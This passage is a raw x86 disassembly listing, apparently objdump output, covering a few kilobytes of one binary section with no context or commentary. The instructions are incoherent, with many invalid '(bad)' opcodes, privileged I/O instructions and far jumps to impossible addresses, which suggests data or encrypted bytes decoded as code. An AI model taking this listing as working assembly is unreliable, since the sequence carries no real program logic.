  409387:	dec    ecx
  409388:	or     al,0x15
  40938a:	inc    eax
  40938b:	push   edi
  40938c:	das    
  40938d:	mov    ecx,0x50a28122
  409392:	gs mov esp,0x2cf72fa0
  409398:	imul   ebx,DWORD PTR [ebx+0x1c],0xc1f504c9
  40939f:	aad    0x3d
  4093a1:	stc    
  4093a2:	sub    ah,BYTE PTR [eax+ecx*1]
  4093a5:	arpl   bx,bx
  4093a7:	ss imul si,di,0x5d
  4093ac:	sbb    eax,0xfa4f7a2a
  4093b1:	cmp    esi,DWORD PTR [ebp+0x14959329]
  4093b7:	repnz (bad) 
  4093b9:	addr16 out 0x24,al
  4093bc:	loopne 0x4093fe
  4093be:	retf   
  4093bf:	adc    eax,0x2f82e238
  4093c4:	push   ecx
  4093c5:	out    0x68,eax
  4093c7:	(bad)  
  4093c8:	icebp  
  4093c9:	mov    ch,0xf8
  4093cb:	push   esp
  4093cc:	hlt    
  4093cd:	pop    ebx
  4093ce:	push   esi
  4093cf:	aam    0x16
  4093d1:	push   edx
  4093d2:	push   esi
  4093d3:	sub    al,0xa9
  4093d5:	cmp    ecx,DWORD PTR [ebx+0x4d965fda]
  4093db:	adc    al,0xf0
  4093dd:	ficomp DWORD PTR [ebx-0x4]
  4093e0:	dec    esi
  4093e1:	in     al,0x4b
  4093e3:	and    ecx,DWORD PTR [edi-0x2d711134]
  4093e9:	mov    dl,0x55
  4093eb:	or     al,0x5f
  4093ed:	inc    esi
  4093ee:	pop    edi
  4093ef:	fcmove st,st(1)
  4093f1:	fist   DWORD PTR [eax+0x3e0696ed]
  4093f7:	push   0xffffffc8
  4093f9:	arpl   WORD PTR [edi-0x7],bp
  4093fc:	push   ss
  4093fd:	pop    ss
  4093fe:	add    al,0x3a
  409400:	ja     0x4093d4
  409402:	mov    ds:0x4f094508,al
  409407:	dec    edi
  409408:	lods   al,BYTE PTR ds:[esi]
  409409:	imul   ecx,DWORD PTR [esi],0x37624a7f
  40940f:	cld    
  409410:	and    BYTE PTR [eax+0x0],dl
  409413:	int    0x56
  409415:	fucomip st,st(7)
  409417:	cmp    eax,0x837e4412
  40941c:	fdivp  st(3),st
  40941e:	jl     0x40947e
  409420:	xor    edx,ebp
  409422:	loopne 0x40944a
  409424:	mov    al,0x64
  409426:	pop    es
  409427:	xor    eax,edx
  409429:	arpl   WORD PTR [esi-0x2d69ec27],dx
  40942f:	mov    ebx,0xe7045588
  409434:	cs inc ebx
  409436:	stos   DWORD PTR es:[edi],eax
  409437:	(bad)  
  409438:	scas   al,BYTE PTR es:[edi]
  409439:	arpl   WORD PTR [ebp-0x6f],di
  40943c:	loope  0x409418
  40943e:	and    BYTE PTR [eax-0x2b],0x67
  409442:	out    dx,al
  409443:	lea    esp,[ecx+0x19b68616]
  409449:	mov    ch,0x17
  40944b:	and    al,BYTE PTR [edx-0x50aa5478]
  409451:	outs   dx,BYTE PTR ds:[esi]
  409452:	inc    ebp
  409453:	cli    
  409454:	mov    esi,0x664a8bce
  409459:	jge    0x409400
  40945b:	ins    DWORD PTR es:[edi],dx
  40945c:	mov    ebp,0x68091075
  409461:	jg     0x40949c
  409463:	sub    BYTE PTR [ebx+eax*4+0x5a],0x74
  409468:	lock in al,dx
  40946a:	es enter 0x6af8,0xa1
  40946f:	inc    ecx
  409470:	and    eax,0xf12e52e1
  409475:	pop    ebx
  409476:	lods   eax,DWORD PTR ds:[esi]
  409477:	inc    ebp
  409478:	xor    ah,BYTE PTR [ebp-0x5ce77162]
  40947e:	rcl    cl,0xb7
  409481:	loop   0x4094bc
  409483:	pop    edx
  409484:	add    DWORD PTR [edi-0x5706c208],0x53
  40948b:	pop    ebp
  40948c:	in     al,dx
  40948d:	test   al,ch
  40948f:	and    BYTE PTR [eax+0x1d],ah
  409492:	pushf  
  409493:	cmc    
  409494:	enter  0x8374,0x81
  409498:	mov    ebp,DWORD PTR [ecx-0x58ac030d]
  40949e:	sub    esp,DWORD PTR [esi-0x4]
  4094a1:	fsubp  st(6),st
  4094a3:	sbb    DWORD PTR [ecx+0x1f],ebx
  4094a6:	cdq    
  4094a7:	pop    es
  4094a8:	in     eax,dx
  4094a9:	push   cs
  4094aa:	sub    DWORD PTR [edx+0x3a],0x5df0e57e
  4094b1:	aas    
  4094b2:	mov    DWORD PTR [ecx+0x2e],eax
  4094b5:	xchg   ecx,eax
  4094b6:	jecxz  0x4094d2
  4094b8:	popa   
  4094b9:	stos   DWORD PTR es:[edi],eax
  4094ba:	gs sbb eax,0x73efa953
  4094c0:	fild   DWORD PTR [ebx+0x6c]
  4094c3:	xor    edx,ecx
  4094c5:	call   0xcae401fb
  4094ca:	int3   
  4094cb:	aam    0xd5
  4094cd:	mov    edi,0xe07e9469
  4094d2:	test   ebp,ebp
  4094d4:	jbe    0x4094d6
  4094d6:	push   eax
  4094d7:	icebp  
  4094d8:	lods   eax,DWORD PTR ds:[esi]
  4094d9:	pop    ebx
  4094da:	mov    edi,0xa1ba9bc7
  4094df:	dec    ebp
  4094e0:	xor    edx,DWORD PTR [ecx+0x77]
  4094e3:	jo     0x4094bc
  4094e5:	dec    ebp
  4094e6:	lods   al,BYTE PTR ds:[esi]
  4094e7:	fsubr  st,st(1)
  4094e9:	psubusb mm3,QWORD PTR [esp+edi*1]
  4094ed:	pop    ecx
  4094ee:	pop    eax
  4094ef:	dec    esp
  4094f0:	inc    BYTE PTR [esi+esi*1]
  4094f3:	cld    
  4094f4:	daa    
  4094f5:	shr    DWORD PTR [ecx-0x239cb353],0xa9
  4094fc:	or     bl,BYTE PTR [esi+0x66]
  4094ff:	add    al,0xed
  409501:	push   0x22a46ed0
  409506:	call   0x535f:0xd525f302
  40950d:	and    bl,BYTE PTR [edi+0x3b765045]
  409513:	mov    ebp,ecx
  409515:	xchg   esp,eax
  409516:	popa   
  409517:	mov    al,ds:0xcd42c47e
  40951c:	enter  0x43f,0x6
  409520:	xchg   BYTE PTR [ebp-0x64ee1ffa],ah
  409526:	xchg   BYTE PTR [edx+0x5],dh
  409529:	jbe    0x409565
  40952b:	dec    eax
  40952c:	pop    ebx
  40952d:	xchg   esp,eax
  40952e:	js     0x409582
  409530:	and    ch,dl
  409532:	pop    esp
  409533:	mov    edi,0xbc91fd4e
  409538:	das    
  409539:	and    bl,BYTE PTR [esi+0x5dc338f8]
  40953f:	sbb    dh,BYTE PTR [eax]
  409541:	push   edi
  409542:	or     eax,0xae52787d
  409547:	push   eax
  409548:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409549:	sub    ch,BYTE PTR [ecx]
  40954b:	pop    ds
  40954c:	sbb    dh,ah
  40954e:	push   edx
  40954f:	leave  
  409550:	aas    
  409551:	and    esp,DWORD PTR [edi]
  409553:	pop    ebp
  409554:	inc    ebx
  409555:	out    0x46,al
  409557:	mov    dl,0xda
  409559:	(bad)  
  40955a:	test   DWORD PTR [eax+0x64],eax
  40955d:	test   BYTE PTR [esi+0x538a69ba],ah
  409563:	dec    edx
  409564:	stos   BYTE PTR es:[edi],al
  409565:	(bad)  
  409566:	std    
  409567:	cmp    al,0x1b
  409569:	fnsave [edx-0xc]
  40956c:	jns    0x4095bb
  40956e:	adc    edx,DWORD PTR [ebx]
  409570:	mov    dl,BYTE PTR [edx+0x6d592ca1]
  409576:	in     al,dx
  409577:	and    al,0x61
  409579:	add    cl,BYTE PTR [edx+0x58]
  40957c:	dec    esp
  40957d:	pushf  
  40957e:	pop    ecx
  40957f:	pop    esi
  409580:	mov    dl,0x92
  409582:	ins    BYTE PTR es:[edi],dx
  409583:	imul   esp,DWORD PTR [ebp-0x72092112],0x4c
  40958a:	call   0xfd19:0xf0373e5
  409591:	jle    0x4095a9
  409593:	mov    dl,0x4d
  409595:	mov    al,ds:0xa57083d3
  40959a:	dec    edi
  40959b:	sti    
  40959c:	xchg   ecx,eax
  40959d:	jp     0x40957f
  40959f:	std    
  4095a0:	xlat   BYTE PTR ds:[ebx]
  4095a1:	shl    ebx,0x51
  4095a4:	mov    dh,0xaf
  4095a6:	and    al,0x55
  4095a8:	mov    ecx,esp
  4095aa:	mov    BYTE PTR [ebp-0x37],cl
  4095ad:	sub    DWORD PTR [ebp-0x5f8a0a9a],edx
  4095b3:	loopne 0x40962f
  4095b5:	mov    eax,0xc1a4f511
  4095ba:	or     esp,ebp
  4095bc:	adc    DWORD PTR [ecx+0x1fa2a85a],edx
  4095c2:	retf   
  4095c3:	pop    ecx
  4095c4:	fwait
  4095c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095c6:	in     eax,0xf3
  4095c8:	mov    ebp,0xc9d8cde0
  4095cd:	pusha  
  4095ce:	iret   
  4095cf:	out    0x68,eax
  4095d1:	retf   0x6e55
  4095d4:	mov    ch,0xa5
  4095d6:	div    DWORD PTR [edx-0x3acf6581]
  4095dc:	dec    esp
  4095dd:	dec    edi
  4095de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095df:	dec    esi
  4095e0:	inc    ebx
  4095e1:	xchg   ecx,eax
  4095e2:	xor    BYTE PTR [edx],cl
  4095e4:	or     BYTE PTR [ecx+0x21869137],bh
  4095ea:	pop    edi
  4095eb:	mov    BYTE PTR ds:[edx],bl
  4095ee:	in     eax,0x5
  4095f0:	mov    esi,0xdee8988
  4095f5:	jecxz  0x40962c
  4095f7:	and    bh,BYTE PTR [edx]
  4095f9:	and    eax,0x2396ec
  4095fe:	push   esi
  4095ff:	sbb    BYTE PTR [edx+ebx*2],bh
  409602:	sahf   
  409603:	stos   BYTE PTR es:[edi],al
  409604:	sbb    cl,dh
  409606:	fs in  eax,0xff
  409609:	icebp  
  40960a:	inc    esp
  40960b:	shr    BYTE PTR [ecx+0x21],1
  40960e:	mov    ebx,0xaeb56a08
  409613:	xor    al,0x11
  409615:	push   esp
  409616:	xor    al,0x8f
  409618:	hlt    
  409619:	mov    dl,0xe
  40961b:	ret    0x7104
  40961e:	xor    BYTE PTR [edi+0x58],dl
  409621:	cli    
  409622:	fdivr  QWORD PTR ds:0xe1613602
  409628:	imul   edi,DWORD PTR [edx+0x11],0x79
  40962c:	push   0xfffffff4
  40962e:	jle    0x40968e
  409630:	xlat   BYTE PTR ds:[ebx]
  409631:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409632:	ins    BYTE PTR es:[edi],dx
  409633:	and    al,0xc4
  409635:	pop    DWORD PTR [ebx+0x70]
  409638:	cli    
  409639:	(bad)
  40963c:	lods   al,BYTE PTR ds:[esi]
  40963d:	fimul  DWORD PTR [edi+0x79847608]
  409643:	xchg   edi,eax
  409644:	and    eax,0x4f339f8c
  409649:	jb     0x4096c0
  40964b:	jb     0x40968e
  40964d:	push   es
  40964e:	jp     0x409617
  409650:	pop    ds
  409651:	inc    esi
  409652:	dec    esp
  409653:	nop
  409654:	jns    0x4096a7
  409656:	sbb    DWORD PTR ds:0x12ea8125,esi
  40965c:	mov    esi,0xda6cc3f7
  409661:	popf   
  409662:	into   
  409663:	lds    edi,FWORD PTR [edi]
  409665:	mov    dl,BYTE PTR [edx]
  409667:	ja     0x40960e
  409669:	rol    DWORD PTR [ebp-0x25214403],cl
  40966f:	stos   BYTE PTR es:[edi],al
  409670:	sahf   
  409671:	xor    al,0x3a
  409673:	xchg   dh,dh
  409675:	test   DWORD PTR [ebx+0x471e9b2b],0x87e86525
  40967f:	js     0x4096a9
  409681:	test   eax,0x9de82c6d
  409686:	cs dec ecx
  409688:	jmp    0x40968b
  40968a:	scas   al,BYTE PTR es:[edi]
  40968b:	cmc    
  40968c:	sahf   
  40968d:	inc    esp
  40968e:	and    cl,bl
  409690:	icebp  
  409691:	ror    BYTE PTR [edi+ecx*4],0x46
  409695:	xor    ch,BYTE PTR [ebp+0x6224f2d1]
  40969b:	jne    0x4096b3
  40969d:	pop    ds
  40969e:	mov    ds:0x1ba8e0d3,eax
  4096a3:	clc    
  4096a4:	adc    BYTE PTR [ecx],dh
  4096a6:	dec    ebx
  4096a7:	xor    eax,0xe35798d3
  4096ac:	in     al,dx
  4096ad:	cwde   
  4096ae:	pop    ds
  4096af:	adc    edi,DWORD PTR [ebp+0x3f]
  4096b2:	push   edx
  4096b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096b4:	and    eax,0x884a1d6d
  4096b9:	push   0xffffff91
  4096bb:	and    DWORD PTR [eax],esi
  4096bd:	repz push edi
  4096bf:	jbe    0x4096de
  4096c1:	sbb    esi,DWORD PTR [edi-0x5404039f]
  4096c7:	(bad)  
  4096c8:	rol    BYTE PTR [edx+0x11ea7f74],0xb5
  4096cf:	pushf  
  4096d0:	mov    ebp,DWORD PTR [ebx-0x16]
  4096d3:	sub    bl,BYTE PTR [eax+eax*8-0x36]
  4096d7:	outs   dx,DWORD PTR ds:[esi]
  4096d8:	scas   al,BYTE PTR es:[edi]
  4096d9:	idiv   BYTE PTR [esi]
  4096db:	pusha  
  4096dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096dd:	push   ss
  4096de:	inc    ebx
  4096df:	leave  
  4096e0:	sub    BYTE PTR [ebx],bl
  4096e2:	aam    0x52
  4096e4:	or     BYTE PTR fs:[eax-0x433a425b],dl
  4096eb:	inc    ebp
  4096ec:	and    ah,ch
  4096ee:	popf   
  4096ef:	sub    al,0x25
  4096f1:	inc    edi
  4096f2:	(bad)  
  4096f3:	retf   0x4218
  4096f6:	push   dx
  4096f8:	sub    dl,BYTE PTR [edi+eiz*1]
  4096fb:	jnp    0x4096f9
  4096fd:	xor    ch,ch
  4096ff:	xor    BYTE PTR [edi+0x3ed9de4c],0x9f
  409706:	sbb    DWORD PTR [ecx-0x67],eax
  409709:	arpl   WORD PTR [esi],di
  40970b:	xchg   DWORD PTR [edx+0x5a],esp
  40970e:	cld    
  40970f:	mov    al,0x76
  409711:	sbb    edx,edi
  409713:	push   ss
  409714:	and    BYTE PTR [ebx],0x3b
  409717:	lods   eax,DWORD PTR ds:[esi]
  409718:	xchg   DWORD PTR [ebx-0x5d],ebx
  40971b:	ret    0x5cb3
  40971e:	lahf   
  40971f:	mov    eax,ds:0xf5c0f948
  409724:	test   DWORD PTR [edi+esi*4],edx
  409727:	in     al,0x0
  409729:	mov    bh,0xb8
  40972b:	cmp    ebp,esi
  40972d:	pop    ebp
  40972e:	jmp    0x3993:0x7e3e5b27
  409735:	mov    ecx,0xe6860b6d
  40973a:	jno    0x409733
  40973c:	das    
  40973d:	shl    DWORD PTR ds:0x66e7f8eb,cl
  409743:	fld    TBYTE PTR [esi+ebp*8+0x76]
  409747:	cmp    ebx,esp
  409749:	pop    ebx
  40974a:	push   eax
  40974b:	sub    BYTE PTR [eax-0x419df63d],ch
  409751:	jno    0x4096d9
  409753:	lahf   
  409754:	push   es
  409755:	mov    eax,ds:0x6dd29e11
  40975a:	test   DWORD PTR [esi+0x6d3d632c],0x6c492d7f
  409764:	add    edx,0xaceb194a
  40976a:	pop    edx
  40976b:	mov    esp,0xad31da94
  409770:	inc    edx
  409771:	mov    ch,0x93
  409773:	push   ebp
  409774:	xchg   edi,edi
  409776:	pop    edi
  409777:	fild   WORD PTR [esi]
  409779:	pop    ecx
  40977a:	mov    ebx,0xc5dc3592
  40977f:	sub    edx,DWORD PTR ds:0x9965c68b
  409785:	aad    0x4d
  409787:	cmp    eax,DWORD PTR [eax-0x5eea1f02]
  40978d:	adc    al,BYTE PTR [ecx-0x6]
  409790:	imul   esp,esp,0x3d
  409793:	pop    es
  409794:	outs   dx,BYTE PTR ds:[esi]
  409795:	mov    BYTE PTR [edx-0x717d3e37],ah
  40979b:	les    edx,FWORD PTR [ebx]
  40979d:	jg     0x4097d4
  40979f:	ja     0x409791
  4097a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097a2:	adc    al,BYTE PTR [ebp-0x46]
  4097a5:	fadd   DWORD PTR [ebx]
  4097a7:	fild   QWORD PTR [esi]
  4097a9:	neg    BYTE PTR [ebx+0x7]
  4097ac:	js     0x409746
  4097ae:	cmp    eax,0xdea681b0
  4097b3:	jo     0x409762
  4097b5:	mov    BYTE PTR [edi-0x47d69a7b],cl
  4097bb:	into   
  4097bc:	data16 outs dx,BYTE PTR ds:[esi]
  4097be:	popa   
  4097bf:	sub    DWORD PTR [eax-0x2f],0xcb88b57d
  4097c6:	push   edi
  4097c7:	sub    BYTE PTR [bx+si],bl
  4097ca:	cld    
  4097cb:	xor    al,0xf6
  4097ce:	push   eax
  4097cf:	mov    ds:0x6a22d0fc,eax
  4097d4:	jp     0x4097f4
  4097d6:	ja     0x409809
  4097d8:	and    al,BYTE PTR [edx-0x61]
  4097db:	and    al,BYTE PTR [ecx]
  4097dd:	adc    bl,al
  4097df:	add    esi,ebp
  4097e1:	dec    ebx
  4097e2:	and    cl,BYTE PTR [ecx+0x7a]
  4097e5:	in     eax,0xb2
  4097e7:	push   edx
  4097e8:	push   ebp
  4097e9:	push   ebx
  4097ea:	aam    0x0
  4097ec:	inc    esp
  4097ed:	add    ebx,DWORD PTR [esp+ecx*1]
  4097f0:	jle    0x4097ad
  4097f2:	clc    
  4097f3:	add    al,0xeb
  4097f5:	jp     0x4097f6
  4097f7:	push   ecx
  4097f8:	outs   dx,DWORD PTR ds:[esi]
  4097f9:	mov    ebx,DWORD PTR [ecx]
  4097fb:	cmc    
  4097fc:	cs call 0x59dc89d
  409802:	mov    dh,BYTE PTR [esi+0x197c3c9f]
  409808:	adc    BYTE PTR [eax+0x6],dh
  40980b:	ja     0x409810
  40980d:	rcl    DWORD PTR [ecx+0x79a4f8c5],0x8d
  409814:	xor    eax,DWORD PTR [ebx+0x791f8da6]
  40981a:	jecxz  0x409824
  40981c:	xor    esp,esp
  40981e:	div    DWORD PTR [edi-0x587c8e13]
  409824:	outs   dx,DWORD PTR ds:[esi]
  409825:	dec    ebp
  409826:	fsubr  DWORD PTR [edx+0x30]
  409829:	imul   ecx
  40982b:	sbb    al,bl
  40982d:	in     al,0x90
  40982f:	pop    es
  409830:	mov    ebp,edx
  409832:	or     al,0x9b
  409834:	cli    
  409835:	loope  0x409826
  409837:	loopne 0x40983f
  409839:	(bad)  
  40983a:	jecxz  0x4098a5
  40983c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40983d:	jne    0x4097c1
  40983f:	mov    esi,DWORD PTR [esi+0x19ae543b]
  409845:	ficom  WORD PTR [edi-0x47b16de1]
  40984b:	repnz shl BYTE PTR [edi+0x569fbf51],0xc4
  409853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409854:	dec    ecx
  409855:	adc    BYTE PTR [ebx],dh
  409857:	xlat   BYTE PTR ds:[ebx]
  409858:	cmp    ecx,DWORD PTR [edi+0x6e6b587]
  40985e:	jmp    0x40985e
  409860:	into   
  409861:	adc    ebp,edi
  409863:	enter  0x63a1,0xf4
  409867:	cld    
  409868:	jns    0x409817
  40986a:	into   
  40986b:	xchg   edx,eax
  40986c:	icebp  
  40986d:	sbb    edx,0x77a97744
  409873:	sti    
  409874:	sbb    eax,0x7205480e
  409879:	sub    al,0x96
  40987b:	ficomp WORD PTR [eax]
  40987d:	std    
  40987e:	sar    BYTE PTR [edx+0x19b2381b],0x7f
  409885:	push   edx
  409886:	mov    ebx,DWORD PTR [esp+ebx*2-0x4ac07d16]
  40988d:	jns    0x4098cf
  40988f:	mov    esp,0x82d7fe67
  409894:	ret    
  409895:	add    eax,0x4d99b14e
  40989a:	loopne 0x409886
  40989c:	in     eax,0x65
  40989e:	sbb    eax,0x1c301233
  4098a3:	pop    ebx
  4098a4:	aaa    
  4098a5:	mov    cl,0xc6
  4098a7:	lods   eax,DWORD PTR ds:[esi]
  4098a8:	push   ebx
  4098a9:	int    0xa9
  4098ab:	test   edi,esp
  4098ad:	xor    al,0x67
  4098af:	ss mov esp,0x80e5395
  4098b5:	(bad)  
  4098b6:	adc    ecx,DWORD PTR [ecx+0x50]
  4098b9:	dec    DWORD PTR [ebx+0x3e7ea5c4]
  4098bf:	(bad)  
  4098c0:	cmp    eax,0xf6940713
  4098c5:	push   ss
  4098c6:	ror    DWORD PTR [ecx+0x5ca0fa2],cl
  4098cc:	sti    
  4098cd:	cmp    edi,DWORD PTR [eax-0x563dc765]
  4098d3:	or     BYTE PTR [ebx],bl
  4098d5:	bswap  ebp
  4098d7:	mov    esi,0x931ce738
  4098dc:	sti    
  4098dd:	int    0xb3
  4098df:	pop    edi
  4098e0:	rol    ch,cl
  4098e2:	loope  0x409870
  4098e4:	add    al,0x7c
  4098e7:	pop    es
  4098e8:	lds    ebp,FWORD PTR [ecx+0x63e05605]
  4098ee:	dec    esi
  4098ef:	push   ecx
  4098f0:	das    
  4098f1:	pop    esp
  4098f2:	adc    dh,BYTE PTR [edx]
  4098f4:	rcl    DWORD PTR [edi+0x59],1
  4098f7:	dec    ebx
  4098f8:	adc    edx,DWORD PTR [edi+eiz*4+0x5f]
  4098fc:	and    DWORD PTR [edx-0x7480d789],edi
  409902:	je     0x4098b7
  409904:	pushf  
  409905:	mov    al,ss:0x49a7b7e6
  40990b:	sbb    dh,BYTE PTR ds:[ebx+0x136e2663]
  409912:	sbb    BYTE PTR [esi+0x5c],ch
  409915:	push   cs
  409916:	xchg   edx,eax
  409917:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409918:	inc    edi
  409919:	jae    0x409998
  40991b:	loopne 0x4098a2
  40991d:	dec    edi
  40991e:	mov    dl,0xca
  409920:	fisub  WORD PTR [esi+0xa]
  409923:	xor    eax,0xdf9da436
  409928:	out    dx,al
  409929:	aas    
  40992a:	aaa    
  40992b:	les    eax,FWORD PTR [ecx+ebp*1+0x68]
  40992f:	jecxz  0x4099a5
  409931:	xchg   esi,eax
  409932:	sbb    esp,DWORD PTR [eax+edx*4-0x3e]
  409936:	sbb    bh,BYTE PTR [edx+0x492ce234]
  40993c:	(bad)
  409940:	outs   dx,DWORD PTR ds:[esi]
  409941:	clc    
  409942:	jmp    0xe758:0x40a3d83e
  409949:	imul   ebx,DWORD PTR [ebx-0x60],0xeeeab24
  409950:	in     eax,dx
  409951:	mov    esp,0xbb9c51e1
  409956:	ficom  WORD PTR [eax+0x5a]
  409959:	add    BYTE PTR [esi],dh
  40995b:	sbb    esi,DWORD PTR [eax]
  40995d:	add    ebx,0xffffffda
  409960:	push   esp
  409961:	sbb    al,0x46
  409963:	ss sub eax,0x2ec2e022
  409969:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40996a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40996b:	out    dx,al
  40996c:	int3   
  40996d:	sub    eax,0x35d099f7
  409972:	sahf   
  409973:	pop    ebp
  409974:	in     eax,0xe9
  409976:	test   esp,eax
  409978:	mov    bh,0xc1
  40997a:	sbb    eax,0xa7f8fc85
  40997f:	lods   al,BYTE PTR ds:[esi]
  409980:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409981:	jmp    0x4099b8
  409983:	mov    WORD PTR [ebp+0x5fe0e5ef],ss
  409989:	mov    al,0x92
  40998b:	jle    0x409910
  40998d:	(bad)  
  40998e:	fcmovu st,st(1)
  409990:	adc    BYTE PTR [edi+0x3f],cl
  409993:	push   ds
  409994:	loope  0x4099ef
  409996:	mov    dl,0x8
  409998:	mov    cl,0x34
  40999a:	call   0xfd4c0797
  40999f:	es call 0x4bbabc10
  4099a5:	cld    
  4099a6:	sub    eax,0x4aab555a
  4099ab:	pop    esi
  4099ac:	pop    edx
  4099ad:	cli    
  4099ae:	cmp    al,0x7d
  4099b0:	sub    ah,dl
  4099b2:	push   ecx
  4099b3:	cdq    
  4099b4:	lods   al,BYTE PTR ds:[esi]
  4099b5:	call   0xf51ed912
  4099ba:	ret    
  4099bb:	pusha  
  4099bc:	(bad)  
  4099bd:	fcmove st,st(0)
  4099bf:	pusha  
  4099c0:	fstp   TBYTE PTR [edx]
  4099c2:	and    al,0x54
  4099c4:	xchg   bl,ah
  4099c6:	(bad)  
  4099c7:	into   
  4099c8:	push   0x81744850
  4099cd:	mov    ecx,0x874799b5
  4099d2:	outs   dx,DWORD PTR ds:[esi]
  4099d3:	mov    edx,0x73690979
  4099d8:	xchg   esi,eax
  4099d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099da:	pop    ecx
  4099db:	xor    ebp,DWORD PTR [ecx]
  4099dd:	mov    al,0x4b
  4099df:	push   es
  4099e0:	jae    0x409a1b
  4099e2:	mov    ds:0xd11768d,eax
  4099e7:	test   eax,0x15c21402
  4099ec:	popf   
  4099ed:	jmp    0x409a56
  4099ef:	test   al,0x1a
  4099f1:	mov    bl,BYTE PTR [esi+0x24444540]
  4099f7:	push   ss
  4099f8:	shl    DWORD PTR [ecx],1
  4099fa:	jae    0x40999d
  4099fc:	mov    ds:0x6f2bbdb0,eax
  409a01:	aas    
  409a02:	lods   eax,DWORD PTR ds:[esi]
  409a03:	ret    0x4ded
  409a06:	jle    0x409a4b
  409a08:	push   ebx
  409a09:	cmc    
  409a0a:	or     eax,0x27abf28
  409a0f:	repnz and al,0xa2
  409a12:	ror    BYTE PTR [edi-0xa],1
  409a15:	xor    BYTE PTR [edi+0x3d],dh
  409a18:	sub    edx,DWORD PTR [ebx]
  409a1a:	gs sti 
  409a1c:	mov    gs,ebp
  409a1e:	jl     0x409a81
  409a20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a21:	hlt    
  409a22:	and    edx,DWORD PTR [ebp-0xe]
  409a25:	scas   al,BYTE PTR es:[edi]
  409a26:	daa    
  409a27:	out    0xb4,eax
  409a29:	xchg   esp,eax
  409a2a:	outs   dx,DWORD PTR ds:[esi]
  409a2b:	inc    edi
  409a2c:	adc    BYTE PTR [esi-0x4d],ah
  409a2f:	mov    edi,esp
  409a31:	mov    es,WORD PTR [esi-0x75dc4cfb]
  409a37:	fisubr DWORD PTR [ecx+0x403ead41]
  409a3d:	aas    
  409a3e:	adc    ebx,DWORD PTR [edi+0x5292d846]
  409a44:	call   0x5ece:0xc30c006b
  409a4b:	or     dl,ch
  409a4d:	push   esi
  409a4e:	mov    ebp,0x942d7d78
  409a53:	rcl    BYTE PTR [edi+0xd6314a3],0x11
  409a5a:	pop    esi
  409a5b:	fisub  WORD PTR [eax+ecx*1]
  409a5e:	cmp    al,0x1a
  409a60:	jp     0x409a52
  409a62:	mov    eax,ds:0x328f6557
  409a67:	or     edi,eax
  409a69:	in     al,0x17
  409a6b:	dec    edi
  409a6c:	sbb    BYTE PTR [eax+0x38abd335],0x86
  409a73:	push   cs
  409a74:	push   cs
  409a75:	mov    ah,0xb3
  409a77:	ror    edx,1
  409a79:	adc    ecx,DWORD PTR [edx-0x77]
  409a7c:	and    BYTE PTR [esi+esi*8-0x577ab52c],dl
  409a83:	test   ah,dh
  409a85:	jg     0x409a8e
  409a87:	call   0xf4dc:0xa42f7b37
  409a8e:	jecxz  0x409ae6
  409a90:	adc    BYTE PTR [ebx+eax*2-0x27],dh
  409a94:	mov    WORD PTR [eax-0x3d6403c6],cs
  409a9a:	leave  
  409a9b:	jae    0x409aea
  409a9d:	ds jb  0x409a9e
  409aa0:	cmp    BYTE PTR [eax+0x7e],cl
  409aa3:	mov    ebp,DWORD PTR [ecx-0x2de4c11]
  409aa9:	mov    cl,0xf5
  409aab:	imul   eax,esp,0xffffffa7
  409aae:	sub    edx,DWORD PTR [ecx]
  409ab0:	jae    0x409aac
  409ab2:	in     al,dx
  409ab3:	push   0xe
  409ab5:	hlt    
  409ab6:	sti    
  409ab7:	loope  0x409acf
  409ab9:	nop
  409aba:	js     0x409ab9
  409abc:	push   0x8a8b4717
  409ac1:	int    0x5a
  409ac3:	jae    0x409a98
  409ac5:	pop    ebp
  409ac6:	dec    edx
  409ac7:	shr    BYTE PTR [ebx-0x1a],0x11
  409acb:	xor    ah,BYTE PTR [esi+0x17ab4e5f]
  409ad1:	push   esp
  409ad2:	mov    ch,0xb0
  409ad4:	mov    WORD PTR [ecx],es
  409ad6:	mov    dl,0xed
  409ad8:	stos   BYTE PTR es:[edi],al
  409ad9:	xchg   ebx,eax
  409ada:	sub    ch,0xff
  409add:	in     al,dx
  409ade:	ror    DWORD PTR [edx+0x48],1
  409ae1:	out    0xc9,eax
  409ae3:	fwait
  409ae4:	jg     0x409a75
  409ae6:	(bad)  
  409ae7:	cmc    
  409ae8:	test   DWORD PTR [ecx+0x31],0x5bfff8c5
  409aef:	(bad)  
  409af0:	ins    BYTE PTR es:[edi],dx
  409af1:	test   DWORD PTR [eax+0x11],ebp
  409af4:	ror    DWORD PTR [eax+0x7a05ac86],1
  409afa:	adc    ebp,edx
  409afc:	sbb    BYTE PTR [eax],dh
  409afe:	dec    esp
  409aff:	add    eax,0x66fa48e7
  409b04:	adc    al,0x58
  409b06:	test   eax,0xd28ebebf
  409b0b:	ret    
  409b0c:	sbb    BYTE PTR [eax-0x21],ch
  409b0f:	test   eax,0xb6e31b1e
  409b14:	sbb    DWORD PTR [eax+0x30],edi
  409b17:	lods   al,BYTE PTR ds:[esi]
  409b18:	adc    dl,BYTE PTR [ecx]
  409b1a:	test   eax,0xfc0c21a8
  409b1f:	cmp    DWORD PTR [edi+esi*1+0x74],esp
  409b23:	lods   al,BYTE PTR ds:[esi]
  409b24:	adc    al,0xa4
  409b26:	or     al,0xe9
  409b28:	pop    edx
  409b29:	fwait
  409b2a:	inc    edi
  409b2b:	add    BYTE PTR [ebx+0xf],ch
  409b2e:	lods   al,BYTE PTR ds:[esi]
  409b2f:	lods   eax,DWORD PTR ds:[esi]
  409b30:	ds js  0x409aff
  409b33:	dec    ebx
  409b34:	pop    ds
  409b35:	pop    esi
  409b36:	cwde   
  409b37:	jg     0x409b8c
  409b39:	test   ebp,ebx
